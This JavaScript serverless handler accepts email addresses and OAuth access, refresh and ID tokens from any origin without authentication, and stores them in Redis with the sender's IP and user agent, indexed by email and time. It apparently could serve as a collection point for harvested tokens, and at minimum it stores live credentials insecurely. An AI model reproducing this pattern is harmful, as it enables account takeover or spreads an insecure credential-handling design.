export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ 
            success: false, 
            error: 'Method not allowed' 
        });
    }

    const { 
        email, 
        access_token, 
        refresh_token, 
        id_token, 
        expires_in, 
        token_type, 
        scope 
    } = req.body;

    if (!email || !access_token) {
        return res.status(400).json({ 
            success: false, 
            error: 'Missing required fields: email and access_token' 
        });
    }

    try {
        // Dynamic import for Redis (Vercel serverless)
        const Redis = (await import('ioredis')).default;
        
        const redis = new Redis(process.env.REDIS_URL);

        const tokenId = `token:${Date.now()}:${Math.random().toString(36).substr(2, 9)}`;
        const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown';

        const tokenData = {
            email,
            access_token,
            refresh_token: refresh_token || '',
            id_token: id_token || '',
            expires_in: expires_in || 3600,
            token_type: token_type || 'Bearer',
            scope: scope || '',
            ip,
            user_agent: req.headers['user-agent'] || 'unknown',
            timestamp: new Date().toISOString(),
            expires_at: new Date(Date.now() + (expires_in || 3600) * 1000).toISOString()
        };

        // Save to Redis
        await redis.hmset(tokenId, tokenData);
        await redis.expire(tokenId, 86400); // 24 hours
        await redis.zadd('tokens:by_time', Date.now(), tokenId);
        await redis.sadd(`tokens:email:${email}`, tokenId);

        await redis.quit();

        return res.status(200).json({
            success: true,
            token_id: tokenId,
            ip,
            timestamp: tokenData.timestamp,
            expires_at: tokenData.expires_at
        });

    } catch (error) {
        console.error('Save tokens error:', error);
        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
}